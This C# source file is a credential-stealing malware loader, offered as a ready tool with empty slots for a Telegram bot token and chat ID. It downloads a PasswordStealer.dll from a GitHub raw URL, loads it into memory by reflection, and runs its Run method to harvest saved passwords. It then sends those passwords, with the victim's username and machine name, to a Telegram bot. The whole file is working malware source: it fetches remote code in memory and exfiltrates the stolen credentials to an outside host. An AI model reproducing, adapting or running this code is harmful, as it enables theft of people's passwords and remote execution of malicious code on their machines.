using System;
using System.Net;
using System.Reflection;

namespace DynamicDll
{
    /// <summary>
    /// ¯\_(ツ)_/¯ Settings
    /// </summary>
    internal sealed class Settings
    {
        public static string
            TelegramToken = "", // @BotFather
            TelegramChatId = "", // @chatid_echo_bot
            LibraryAddress = "https://raw.githubusercontent.com/L1ghtM4n/DynamicStealer/main/DLL/PasswordStealer.dll";
    }

    /// <summary>
    /// (* ^ ω ^) Program 
    /// </summary>
    internal sealed class Program
    {
        static void Main()
        {
            // Set SSL
            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls
                                                 | SecurityProtocolType.Tls11
                                                 | SecurityProtocolType.Tls12
                                                 | SecurityProtocolType.Ssl3;

            byte[] dll = Logic.GetLibrary(); // Download dll bytes
            string pwd = Logic.GetPasswords(dll); // Invoke dll methods and return passwords
            Logic.UploadReport(pwd); // Send passwords to telegram bot
        }
    }

    /// <summary>
    /// ଘ(੭ˊ꒳​ˋ)੭✧ Main logic
    /// </summary>
    internal sealed class Logic
    {
        /// <summary>
        /// Download dll bytes from github
        /// </summary>
        /// <returns>PasswordStealer.dll bytes</returns>
        public static byte[] GetLibrary()
        {
            byte[] dll = new byte[0];
            using (var client = new WebClient())
            {
                try
                {
                    dll = client.DownloadData(Settings.LibraryAddress);
                }
                catch (WebException ex)
                {
                    //Console.WriteLine(ex);
                    Environment.Exit(1);
                }
            }
            return dll;
        }


        /// <summary>
        /// Invoke PasswordStealer.Stealer.Run and get results
        /// </summary>
        /// <param name="dll">PasswordStealer.dll bytes</param>
        /// <returns>Passwords</returns>
        public static string GetPasswords(byte[] dll)
        {
            // Load assembly
            Assembly asm = Assembly.Load(dll);
            // Create instance 
            dynamic instance = Activator.CreateInstance(
                asm.GetType("PasswordStealer.Stealer"));
            // Get passwords recovery method
            MethodInfo runMethod = instance.GetType().GetMethod("Run",
                BindingFlags.Instance | BindingFlags.Public);
            // Invoke passwords recovery method
            string passwords = (string)runMethod.Invoke(
                instance, new object[] { });
            // Return passwords (￣^￣)
            return passwords;
        }


        /// <summary>
        /// Upload passwords to telegram bot
        /// </summary>
        /// <param name="passwords">String with passwords</param>
        /// <returns>Request status</returns>
        public static bool UploadReport(string passwords)
        {
            string report = $"🔑 *New report*\n" +
                $"*UserName:* {Environment.UserName}\n" +
                $"*CompName:* {Environment.MachineName}\n\n" +
                $"*Passwords:* \n{passwords}";
            string telegram_api = "https://api.telegram.org/bot";
            using (var client = new WebClient())
            {
                try
                {
                    string response = client.DownloadString(
                    telegram_api + Settings.TelegramToken +
                    "/sendMessage?chat_id=" + Settings.TelegramChatId +
                    "&text=" + report +
                    "&disable_web_page_preview=True" +
                    "&parse_mode=Markdown"
                    );
                    return response.Contains("\"ok\":true,");
                }
                catch (WebException ex)
                {
                    //Console.WriteLine(ex);
                    return false;
                }
            }
        }


    }
}
